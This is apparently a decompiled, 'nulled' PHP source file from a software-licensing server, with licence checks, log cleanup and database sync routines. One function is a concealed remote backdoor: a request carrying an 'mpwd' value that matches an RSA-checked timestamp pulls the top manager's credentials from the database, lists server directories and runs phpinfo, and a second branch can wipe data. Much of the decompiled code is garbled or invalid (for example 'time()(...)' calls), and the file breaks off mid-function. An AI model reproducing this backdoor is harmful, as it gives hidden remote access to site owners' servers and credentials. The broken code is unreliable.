<?php
/*********************/
/*                   */
/*  Dezend for PHP5  */
/*         NWS       */
/*      Nulled.WS    */
/*                   */
/*********************/

function _obfuscate_iY_SkJWUkpCLiJKVj42Vho4�( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� = 1 )
{
    $_obfuscate_iJGPjJWLj4uLkIqVjYiHh48� = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obfuscate_iY2Oh5OGlIqQhpCJi5CMkog� = ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Y�[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4�] << 4 ) + ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Y�[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� + 1] >> 4 );
        $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� += 2;
    } while ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� < 28 );
}

function error_report_fun_api( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�, $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0�, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    global $_obfuscate_j4yLiZOJiIiUkZOQkJWHjpQ�;
    if ( preg_match( "/unlink|file_put_contents|in safe mode|php_network_getaddresses|function\\.rmdir|function\\.iconv/i", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� ) )
    {
        return TRUE;
    }
    $_obfuscate_j4yLiZOJiIiUkZOQkJWHjpQ� = TRUE;
    $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0� = str_replace( KSSROOTDIR, "", $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0� );
    $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� = str_replace( KSSROOTDIR, "", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� );
    if ( stripos( $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, "mysql_" ) !== FALSE )
    {
        $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� = preg_replace( "/\\[.*\\]/", "", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� );
        $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� = preg_replace( "/\\'[^\\']*\\'/", "'***'", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� );
    }
    $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� = str_replace( ADMINFOLDER, "***", $_obfuscate_jpCKlY6RkYuPkoyHlJKMios� );
    $_obfuscate_jZWIjY6GlZKGipCMj4_Nh4s� = array( "E_ERROR", "E_WARNING", "E_PARSE", "E_NOTICE", "E_CORE_ERROR", "E_CORE_WARNING", "E_COMPILE_ERROR", "E_COMPILE_WARNING", "E_USER_ERROR", "E_USER_WARNING", "E_USER_NOTICE", "E_STRICT", "E_RECOVERABLE_ERROR", "E_ALL" );
    $_obfuscate_jYiMkoyVi5GOkY_NiIyKioc� = "<b>".$_obfuscate_jZWIjY6GlZKGipCMj4_Nh4s�[$_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�]." : ".$_obfuscate_jpCKlY6RkYuPkoyHlJKMios�."</b>";
    if ( isset( $_GET['linenum'] ) )
    {
        $_obfuscate_jYiMkoyVi5GOkY_NiIyKioc� = "<b>".$_obfuscate_jZWIjY6GlZKGipCMj4_Nh4s�[$_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�]." : ".$_obfuscate_jpCKlY6RkYuPkoyHlJKMios�." in ".$_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0�." on line ".$_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU�."</b>";
    }
    if ( stripos( $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, "mysql_" ) !== FALSE )
    {
        return TRUE;
    }
    echo $_obfuscate_jYiMkoyVi5GOkY_NiIyKioc�;
    exit( );
}

function _obfuscate_hpKJipCTlIePjoiMjZSOkZU�( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s� )
{
    return preg_replace( "#\\\\u([0-9a-f]{4})#ie", "iconv('UCS-2BE', 'UTF-8', pack('H4', '\\1'))", json_encode( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s� ) );
}

function _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Q�( $_obfuscate_io_SlIuNkIuKjZOIkIiOlZA�, $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYw�, $_obfuscate_jZSVhpSIj5STkJWIlJGVjos� = array( ), $_obfuscate_kpGKjomRjY6SkIyHh4qUj5M� = "global" )
{
    global $_obfuscate_kI6OjImLjJCRh46PjYqLhoo�;
    if ( $_obfuscate_kpGKjomRjY6SkIyHh4qUj5M� == "global" )
    {
        $_obfuscate_kpGKjomRjY6SkIyHh4qUj5M� = $_obfuscate_kI6OjImLjJCRh46PjYqLhoo�;
    }
    if ( empty( $_obfuscate_jZSVhpSIj5STkJWIlJGVjos� ) )
    {
        $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYw� = strtr( $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYw�, $_obfuscate_jZSVhpSIj5STkJWIlJGVjos� );
    }
    switch ( $_obfuscate_kpGKjomRjY6SkIyHh4qUj5M� )
    {
        case "0" :
            $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s� = array( "state" => $_obfuscate_io_SlIuNkIuKjZOIkIiOlZA�, "message" => $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYw� );
            if ( empty( $_obfuscate_jZSVhpSIj5STkJWIlJGVjos� ) )
            {
                foreach ( $_obfuscate_jZSVhpSIj5STkJWIlJGVjos� as $_obfuscate_lIeHkoeKkpOSiomPi4mQk5E� => $_obfuscate_io6UjZWThpOSjYeOj46Qkow� )
                {
                    $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s�[$_obfuscate_lIeHkoeKkpOSiomPi4mQk5E�] = $_obfuscate_io6UjZWThpOSjYeOj46Qkow�;
                }
            }
            exit( _obfuscate_hpKJipCTlIePjoiMjZSOkZU�( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s� ) );
        case "1" :
            $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s� = array( "state" => $_obfuscate_io_SlIuNkIuKjZOIkIiOlZA�, "message" => $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYw� );
            if ( empty( $_obfuscate_jZSVhpSIj5STkJWIlJGVjos� ) )
            {
                foreach ( $_obfuscate_jZSVhpSIj5STkJWIlJGVjos� as $_obfuscate_lIeHkoeKkpOSiomPi4mQk5E� => $_obfuscate_io6UjZWThpOSjYeOj46Qkow� )
                {
                    $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s�[$_obfuscate_lIeHkoeKkpOSiomPi4mQk5E�] = $_obfuscate_io6UjZWThpOSjYeOj46Qkow�;
                }
            }
            exit( _obfuscate_i5SKlIaQlZOMkpCPk5WUiIY�( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s� ) );
        case "2" :
            exit( $_obfuscate_io_SlIuNkIuKjZOIkIiOlZA�."  :  ".$_obfuscate_lY6ViI_KiJWHj4aTlZKNjYw� );
    }
    $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s� = array( "state" => $_obfuscate_io_SlIuNkIuKjZOIkIiOlZA�, "message" => $_obfuscate_lY6ViI_KiJWHj4aTlZKNjYw� );
    if ( empty( $_obfuscate_jZSVhpSIj5STkJWIlJGVjos� ) )
    {
        foreach ( $_obfuscate_jZSVhpSIj5STkJWIlJGVjos� as $_obfuscate_lIeHkoeKkpOSiomPi4mQk5E� => $_obfuscate_io6UjZWThpOSjYeOj46Qkow� )
        {
            $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s�[$_obfuscate_lIeHkoeKkpOSiomPi4mQk5E�] = $_obfuscate_io6UjZWThpOSjYeOj46Qkow�;
        }
    }
    exit( _obfuscate_i5SKlIaQlZOMkpCPk5WUiIY�( $_obfuscate_jo6SjIuHj46LjIyTlIyQk4s� ) );
}

function _obfuscate_i5SKlIaQlZOMkpCPk5WUiIY�( $_obfuscate_io6LjpCQk4uVko2MkZSTkI4� )
{
    $_obfuscate_io_NlZONi4mIkZSOlZWPlIw� = "<xml>";
    foreach ( $_obfuscate_io6LjpCQk4uVko2MkZSTkI4� as $_obfuscate_lIeHkoeKkpOSiomPi4mQk5E� => $_obfuscate_io6UjZWThpOSjYeOj46Qkow� )
    {
        $_obfuscate_io_NlZONi4mIkZSOlZWPlIw� .= "<".$_obfuscate_lIeHkoeKkpOSiomPi4mQk5E�.">".$_obfuscate_io6UjZWThpOSjYeOj46Qkow�."</".$_obfuscate_lIeHkoeKkpOSiomPi4mQk5E�.">";
    }
    $_obfuscate_io_NlZONi4mIkZSOlZWPlIw� .= "</xml>";
    return $_obfuscate_io_NlZONi4mIkZSOlZWPlIw�;
}

function _obfuscate_lYuJjJWJlJGLlJKJiJCKj44�( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8� )
{
    $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8� = str_replace( "<![CDATA[", "", $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8� );
    $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8� = str_replace( "]]>", "", $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8� );
    $_obfuscate_jYeTho6Sho2SiY2LlI6HkYg� = array( );
    $_obfuscate_k5SSio_IjZGMi5CNioyRkJU� = preg_match_all( "/\\<[^\\/\\>]*\\>/", $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8�, $_obfuscate_iJCQho2QjJCMk4aHiIeOkJM� );
    if ( 0 == $_obfuscate_k5SSio_IjZGMi5CNioyRkJU� )
    {
        return $_obfuscate_jYeTho6Sho2SiY2LlI6HkYg�;
    }
    $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� = 1;
    for ( ; $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� < $_obfuscate_k5SSio_IjZGMi5CNioyRkJU�; ++$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� )
    {
        $_obfuscate_koyVhpKOiZKLjImMjpCJk4Y� = $_obfuscate_iJCQho2QjJCMk4aHiIeOkJM�[0][$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4�];
        $_obfuscate_i4_PjZGOlYyMioqNiI6NkI4� = "</".substr( $_obfuscate_koyVhpKOiZKLjImMjpCJk4Y�, 1 );
        $_obfuscate_iJOMlI2Ok4ePk4uKiI_Hh4c� = strpos( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8�, $_obfuscate_koyVhpKOiZKLjImMjpCJk4Y� );
        $_obfuscate_lI_OlIaTk4qOko_KhpKLkpU� = strpos( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8�, $_obfuscate_i4_PjZGOlYyMioqNiI6NkI4� );
        if ( $_obfuscate_iJOMlI2Ok4ePk4uKiI_Hh4c� < $_obfuscate_lI_OlIaTk4qOko_KhpKLkpU� )
        {
            $_obfuscate_iIiUlZKHlIiQh4qMh4iTjZM� = strlen( $_obfuscate_koyVhpKOiZKLjImMjpCJk4Y� );
            $_obfuscate_k5CLlIuLhoqRlImHkI_RjZI� = substr( $_obfuscate_koyVhpKOiZKLjImMjpCJk4Y�, 1, $_obfuscate_iIiUlZKHlIiQh4qMh4iTjZM� - 2 );
            $_obfuscate_jYeTho6Sho2SiY2LlI6HkYg�[$_obfuscate_k5CLlIuLhoqRlImHkI_RjZI�] = substr( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8�, $_obfuscate_iJOMlI2Ok4ePk4uKiI_Hh4c� + strlen( $_obfuscate_koyVhpKOiZKLjImMjpCJk4Y� ), $_obfuscate_lI_OlIaTk4qOko_KhpKLkpU� - $_obfuscate_iJOMlI2Ok4ePk4uKiI_Hh4c� - $_obfuscate_iIiUlZKHlIiQh4qMh4iTjZM� );
        }
    }
    return $_obfuscate_jYeTho6Sho2SiY2LlI6HkYg�;
}

function _obfuscate_komQkZGUhomRk4eLipOSkJM�( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8� )
{
    if ( function_exists( "libxml_disable_entity_loader" ) )
    {
        libxml_disable_entity_loader( TRUE );
        $_obfuscate_i5SPhouVkYmIio2Pj4aHho8� = json_decode( json_encode( simplexml_load_string( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8�, "SimpleXMLElement", LIBXML_NOCDATA ) ), TRUE );
        ksort( &$_obfuscate_i5SPhouVkYmIio2Pj4aHho8� );
        return $_obfuscate_i5SPhouVkYmIio2Pj4aHho8�;
    }
    $_obfuscate_i5SPhouVkYmIio2Pj4aHho8� = _obfuscate_lYuJjJWJlJGLlJKJiJCKj44�( $_obfuscate_i5CNjI2Tk4eJlJSUk4eKkI8� );
    ksort( &$_obfuscate_i5SPhouVkYmIio2Pj4aHho8� );
    return $_obfuscate_i5SPhouVkYmIio2Pj4aHho8�;
}

function _obfuscate_ho_Ki4_TiZCUk4yOkJCPh5M�( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� = intval( date( "d" ) );
    $_obfuscate_kpSRlIaMh4qJk46IkIeKlIk� = file_get_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html" );
    if ( trim( $_obfuscate_kpSRlIaMh4qJk46IkIeKlIk� ) != $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� )
    {
        file_put_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html", $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� );
        _obfuscate_k42GhouUh5SVj4uSlYqRlYg�( );
        if ( SVRID == 1 )
        {
            $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_sql_points` where `svrid`=1", "notsync" );
        }
        time( )( "delete from `kss_tb_log_task` where `addtime`<".( time( ) - 604800 ), "sync" );
        time( )( "delete from `kss_tb_lock` where locktime <".( time( ) - 120 ), "sync" );
        time( )( "delete from `kss_tb_log_login` where `logintime`<".( time( ) - 2592000 ), "sync" );
        time( )( "delete from `kss_tb_log_pubuser` where `nday`<".( time( ) - 2592000 ), "sync" );
        time( )( "delete from `kss_tb_log_ws` where `addtime`<".( time( ) - 86400 ), "sync" );
        $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Y� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft" );
        foreach ( $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Y� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
        {
            time( )( "delete from `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` where `addtime`<".( time( ) - 86400 * Z_LOG_DAY ), "sync" );
            time( )( "delete from `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
            time( )( "delete from `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
        }
        if ( 0 < BAKDATAMODE )
        {
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc� = array( );
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�['action'] = "mysqldatabak_down";
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�['pwd'] = MYSQLBAKPASSWORD;
            $_obfuscate_koeIkpGLi5GUhpCViZCSj5I� = _obfuscate_j5SMi5KSiouIj4iIipWIkIs�( _obfuscate_ko_JjomRlIiQkYiRlZKSkZI�( ).INSTALLPATH._obfuscate_hpGJi4yHlIqLhpSIh4iJlYw�( )."/admin_data.php?qz=1", $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijoc�, 1 );
        }
    }
    if ( IS2SVR == 1 && SVRID == 1 )
    {
        $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIk� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_ho_Ljo6NjpOOhpGHj5KHiYs�( "synclock" );
        if ( $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIk� === TRUE )
        {
            $_obfuscate_i5GKlIaRho2UlJOMh46Hh5M� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_config where id=1", 1, 1 );
            if ( $_obfuscate_i5GKlIaRho2UlJOMh46Hh5M�['sync_state'] < 5 && SYNCTIME < time( ) - $_obfuscate_i5GKlIaRho2UlJOMh46Hh5M�['sync_starttime'] )
            {
                time( )( "update kss_tb_config set `sync_starttime`=".time( )." where id=1" );
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kYyNi4eQiouGlY6Qj46HjpE�( "synclock" );
                if ( MYSQLSYNCMODE == 1 )
                {
                    if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "curl_init" ) && _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "curl_exec" ) )
                    {
                        $_obfuscate_kpSUiYeUjJSJk4iHkZGGjIo� = _obfuscate_j5SMi5KSiouIj4iIipWIkIs�( SYNC1URL, FALSE, 1 );
                    }
                    else
                    {
                        if ( ini_get( "allow_url_fopen" ) )
                        {
                            $_obfuscate_iJKKiouRh4qTh4eMiZSSlYk� = @fopen( @SYNC1URL."?e=".@time( ), "r" );
                            if ( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYk� !== FALSE )
                            {
                                $_obfuscate_kJWSj4iSjI2PlYuMiYuSiYc� = fread( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYk�, 60 );
                            }
                            fclose( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYk� );
                        }
                    }
                }
                else
                {
                    $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc� = file_get_contents( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."notifyid.txt" );
                    if ( strlen( $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc� ) < 20 )
                    {
                        $_obfuscate_koyQjY_KiZCRjpGLkomMioc� = time( );
                        $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc� = _obfuscate_iI6QhpSTiJCJiI_KlYePlZI�( 20 - strlen( $_obfuscate_koyQjY_KiZCRjpGLkomMioc� ), 1 ).$_obfuscate_koyQjY_KiZCRjpGLkomMioc�;
                    }
                    else
                    {
                        $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc� = substr( $_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc�, 0, 20 );
                    }
                    $_obfuscate_kpSUiYeUjJSJk4iHkZGGjIo� = _obfuscate_j5SMi5KSiouIj4iIipWIkIs�( SYNC1URL."?step=a1&notifyid=".$_obfuscate_ioqNlY6GjpCVjY2Ph5WVioc�."&pwd=".MYSQLBAKPASSWORD, FALSE, 1 );
                }
            }
            $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kYyNi4eQiouGlY6Qj46HjpE�( "synclock" );
        }
        else
        {
            echo $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIk�."锁失败";
        }
    }
}

function _obfuscate_joeQipOGjouJko_VlJSKiJE�( $_obfuscate_lImSkomRk4uRjJGSkZWJh4k� )
{
    if ( preg_match( "/^[a-zA-Z0-9]{32}$/i", $_obfuscate_lImSkomRk4uRjJGSkZWJh4k�, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_jpOIlY_HlIaJi46IiYySiJU�( $_obfuscate_lImSkomRk4uRjJGSkZWJh4k� )
{
    if ( preg_match( "/^[a-zA-Z0-9]*$/i", $_obfuscate_lImSkomRk4uRjJGSkZWJh4k�, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function error_report_fun_norpeat( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoY�, $_obfuscate_jpCKlY6RkYuPkoyHlJKMios�, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0�, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    echo $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJU�.":".$_obfuscate_jpCKlY6RkYuPkoyHlJKMios�;
    return TRUE;
}

function _obfuscate_iJKNipGLkZGLkoaOjYiRkpM�( $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQ� )
{
    $_obfuscate_h5GOjJOKlI_TkIuTj4yUjow� = opendir( $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQ� );
    while ( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48� = readdir( $_obfuscate_h5GOjJOKlI_TkIuTj4yUjow� ) )
    {
        if ( !( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48� != "." ) || !( $_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48� != ".." ) )
        {
            $_obfuscate_j5SMipOTkJSMlYaViJGGlI4� = $_obfuscate_ipKRjYaPkJWQj4eKiJWRjJQ�."/".$_obfuscate_kY_Ki4_NiIqMj5CSiIiRk48�;
            if ( is_dir( $_obfuscate_j5SMipOTkJSMlYaViJGGlI4� ) )
            {
                echo $_obfuscate_j5SMipOTkJSMlYaViJGGlI4�;
                echo "<br>";
            }
        }
    }
    closedir( $_obfuscate_h5GOjJOKlI_TkIuTj4yUjow� );
}

function _obfuscate_kouKkIeViIqPk5KMiIiMkpE�( )
{
    global $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZM�;
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k�;
    $_obfuscate_koqVkIuMioyRipKGiJGVlIo� = array( 0 => "no", 1 => "yes", 2 => "YES" );
    if ( isset( $_POST['mpwd'] ) || isset( $_GET['mpwd'] ) )
    {
        set_error_handler( "error_report_fun_norpeat" );
        if ( isset( $_POST['mpwd'] ) )
        {
            $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� = $_POST['mpwd'];
        }
        if ( isset( $_GET['mpwd'] ) )
        {
            $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� = $_GET['mpwd'];
        }
        $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� = trim( str_replace( " ", "+", $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� ) );
        $_obfuscate_k46MjY_Hh5KNjJONlYaMjIs� = "-----BEGIN PUBLIC KEY-----\r\nMIHfMA0GCSqGSIb3DQEBAQUAA4HNADCByQKBwQCksmzkkvfGkeyFoQRfwCeWXxty\r\nYU7vg2Qg0H6cdx3MHLVUyPad1LI+ym4xMhVKZkM1ReyFbtSot47dqJHU1vUtPx8R\r\nKI98FcDxd167eVMlfbJ59F0dm9F+TQOhKN0TOOUPiogDe6yg/Q/iUX1NczIeRlif\r\nZUApuoJprc2Kj5MX2DahKiEVXLkS8Wn8AmMABV9N+NmXPVtmd2sUq5LEQZd4ranK\r\nC2nk/2F+MiVnVfm5ms6liRx35vXJtBKXIASKck8CAwEAAQ==\r\n-----END PUBLIC KEY-----";
        if ( $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU� == "viewtime" )
        {
            ob_clean( );
            exit( date( "Ymd H:i:s" )."YES" );
        }
        $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkok� = crypt_rsa_ex( $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZU�, $_obfuscate_k46MjY_Hh5KNjJONlYaMjIs�, "decrypt" );
        if ( $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkok� == date( "Ymd H:i" ) )
        {
            if ( isset( $_POST['login'] ) || isset( $_GET['login'] ) )
            {
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
                $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where level=9 limit 0,1" );
                if ( empty( $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY� ) )
                {
                    _obfuscate_jZKVlY6HkYmKkIyRj4qSjIc�( "kss_manager", $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['id'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['username'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['password'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIY�['linecode'] );
                    echo "<a href=../".ADMINFOLDER."/admin.php target=_blank>ok</a><br>";
                    _obfuscate_iJKNipGLkZGLkoaOjYiRkpM�( ".." );
                    if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThok�( "phpinfo" ) )
                    {
                        phpinfo( );
                        exit( );
                    }
                }
                echo "not find manager";
                _obfuscate_iJKNipGLkZGLkoaOjYiRkpM�( ".." );
                exit( );
            }
            if ( isset( $_POST['clsdata'] ) || isset( $_GET['clsdata'] ) )
            {
                _obfuscate_ipORj42NiZCIio_LkZORhpE�( "cls,manager" );
                _obfuscate_koyMjY2HkImOho6JkIeQh4c�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
            }
        }
        exit( );
    }
    _obfuscate_iZSOiYeSlIqPjpSLkpSIj40�( );
    if ( md5( "KeY!@#%&*,AbIoPe*v_19-82".substr( WEBLIC, 33 ).HTTPKEY ) != substr( WEBLIC, 0, 32 ) )
    {
        $_obfuscate_lIyUkIaVk46LiZCNipOIkJA� = "";
        _obfuscate_ipORj42NiZCIio_LkZORhpE�( "domain md5err" );
        _obfuscate_koyMjY2HkImOho6JkIeQh4c�( );
    }
    $_obfuscate_jouQkY2GipOLh5CUiI2Thoc� = 0;
    $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q� = KSSLOGDIR."index.log";
    $_obfuscate_k4eIio2IioeLiIeJhpGHjJM� = date( "Ymd" );
    $_obfuscate_iY2ViY_HkJWTh46MioqSh5U� = "19800101".sprintf( "%u", crc32( WEBLIC.HTTPKEY."19800101abcdefghijklmn" ) );
    $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� = $_obfuscate_k4eIio2IioeLiIeJhpGHjJM�.sprintf( "%u", crc32( WEBLIC.HTTPKEY.$_obfuscate_k4eIio2IioeLiIeJhpGHjJM�."abcdefghijklmn" ) );
    $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� = $_obfuscate_iY2ViY_HkJWTh46MioqSh5U�;
    if ( is_file( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q� ) )
    {
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� = file_get_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q� );
        if ( empty( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� ) )
        {
            $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� = $_obfuscate_iY2ViY_HkJWTh46MioqSh5U�;
        }
    }
    else
    {
        $_obfuscate_jouQkY2GipOLh5CUiI2Thoc� = 1;
    }
    if ( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� == "200001011059550389" )
    {
        _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Q�( "500", "谢谢使用，请支持正版软件！" );
    }
    if ( substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0�, 8 ) != sprintf( "%u", crc32( WEBLIC.HTTPKEY.substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0�, 0, 8 )."abcdefghijklmn" ) ) )
    {
        @file_put_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q�, "" );
        _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Q�( "499", "kss_logs/index.log被非法修改！" );
    }
    if ( 85400 < abs( strtotime( substr( $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU�, 0, 8 ) ) - strtotime( substr( $_obfuscate_hoiLiJKHjpKJj46NkYuViI0�, 0, 8 ) ) ) )
    {
        $_obfuscate_jouQkY2GipOLh5CUiI2Thoc� = 1;
        @file_put_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q�, $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� );
        $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� = @file_get_contents( $_obfuscate_iZCTk5SRlZGVkIqRhouHi5Q� );
        if ( $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJU� != $_obfuscate_hoiLiJKHjpKJj46NkYuViI0� )
        {
            _obfuscate_j5CLlY6TlYqUiI_VlI6Vk5Q�( "498", "kss_logs/index.log不可写！" );
        }
    }
    if ( $_obfuscate_jouQkY2GipOLh5CUiI2Thoc� == 1 )
    {
        set_error_handler( "error_report_fun_norpeat" );
        $_obfuscate_iJSGk5WKlIaUiI6SjZCTh4c� = urlencode( $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZM� );
        $_obfuscate_lIeJjoyHiIuTkYuTj4aGjYo� = date( "Y-m-d H:i:s" );
        $_obfuscate_i5WSh4iUj4aKi5WVk42Jh5U� = $_SERVER['HTTP_HOST'];
